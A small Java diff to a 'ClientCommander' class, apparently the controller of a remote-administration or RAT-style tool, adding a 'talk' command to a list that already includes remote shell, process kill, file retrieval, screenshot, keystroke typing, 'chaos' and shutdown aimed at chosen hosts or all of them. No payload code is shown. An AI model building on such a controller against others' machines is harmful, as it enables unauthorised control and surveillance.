@@ -69,7 +69,7 @@ public class ClientCommander implements Runnable
     private boolean commandValid(String command)
     {
         command = command.toLowerCase();
-        return command.equals(CMD_REMOTE_SHELL) || command.equals(CMD_KILL_PROCESS) || command.equals(CMD_LIST_PROCESSES) || command.equals(CMD_MINIMISE) || command.equals(CMD_WALLPAPER) || command.equals(CMD_ROTATE) || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
+        return command.equals(CMD_TALK) || command.equals(CMD_REMOTE_SHELL) || command.equals(CMD_KILL_PROCESS) || command.equals(CMD_LIST_PROCESSES) || command.equals(CMD_MINIMISE) || command.equals(CMD_WALLPAPER) || command.equals(CMD_ROTATE) || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
     }
 
     /**
@@ -160,7 +160,7 @@ public class ClientCommander implements Runnable
     }
 
     /**
-     * processes two argument commands, e.g. wallpaper, sound, type, rotate
+     * processes two argument commands, e.g. wallpaper, sound, type, rotate, talk
      * @param cmd the command itself, e.g. sound
      * @param host the IP address of the host to perform the command on, or all
      * @param arg an argument for the command
